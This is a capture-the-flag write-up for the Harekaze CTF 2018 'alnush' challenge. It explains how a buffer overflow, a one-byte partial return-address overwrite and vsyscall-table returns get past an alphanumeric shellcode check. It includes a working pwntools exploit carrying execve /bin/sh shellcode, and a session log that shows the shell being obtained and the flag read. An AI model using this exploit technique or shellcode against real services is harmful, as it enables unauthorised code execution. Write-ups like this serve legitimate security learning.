---
layout: post
category: Pwn
title: Harekaze CTF 2018 alnush
tags: 
    - kowu
---

We had a x64 service wich allowed us to upload and execute shellcode. So far so good, but only alphanumeric shellcode was allowed. So just put in some premade code and we are done? Nah. It's not that easy. The mempage where the shellcode gets executed later is marked as read and execute only, all of the alphanumeric shellcodes I found required it to be writeable as well so they can decode themselves. Now one could get the idea of jumping to mprotect first, and then perform further exploitation. I did not. I don't even know if that was possible with the limited instructionset. In fact I solved the challenge without writing any alphanumeric shellcode at all, but by tricking the server into accepting (nearly) every shellcode.


If we look at the server it has a straightforward to spot bufferoverflow when entering shellcode. And there are also no stack canaries. So a simple ropchain? Sadly PIE was enabled. So the only chance we have is jumping to one position once by partially overwriting a ret pointer. For a better understanding a picture of the codeflow.

![m1](/assets/img/harekaze_alnush.png)

1 and 2 are the normal returns, ? is where I want to ret to, bypassing the strlen check on the shellcode input, effectively making it useless. For this to work I need to:
- get rax = 0 (or just small)
- fix the stack (so the local arguments match)

How can I do this without having anything reliable to return to? There is one last memory region without ASLR! The vsyscall table. And we can use it to pop off the stack AND to get rax = 0! For this to work at least rdi must point to a writeable address. In our case this condition was met. So all we need to do is:
- pop 4 qwords off the stack by repetitively returning into the vsyscall table
- overwrite the second ret address with one byte (0x4d).
- profit

![m2](/assets/img/harekaze_alnush2.png)

As a bonus we even get a more reliable exploit as we only need to overwrite one byte and don't have to mess with aslr at all. There is only one last restricion, as a strcpy like function was used to copy the shellcode onto the heap, nullbytes and newlines are forbidden characters. Acceptable constraints :)

```python
from pwn import *

r = remote("problem.harekaze.com", 20003)

def pwn():
    r.recvuntil("Enter shellcode >> ")
    sh = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb" \
         "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
    r.send(sh + "X" * (0x208 - len(sh)) + struct.pack("<Q", 0xffffffffff600000) * 4 + struct.pack("B", 0x4d))
    r.interactive()


if __name__ == '__main__':
    pwn()

```
and finally

```
[x] Opening connection to problem.harekaze.com on port 20003
[x] Opening connection to problem.harekaze.com on port 20003: Trying 163.43.29.129
[+] Opening connection to problem.harekaze.com on port 20003: Done
[*] Switching to interactive mode
OK!
$ whoami
alnush
$ ls /home/alnush/
alnush
flag
$ cat /home/alnush/flag
HarekazeCTF{u_ex3cuted_alph4numeric_shellc0de!!!}
```

Wut? `u_ex3cuted_alph4numeric_shellc0de`? Unintended solution? Was there a way to solve this challenge only using alphanumeric chars as well? Why was there an obvious overflow then?
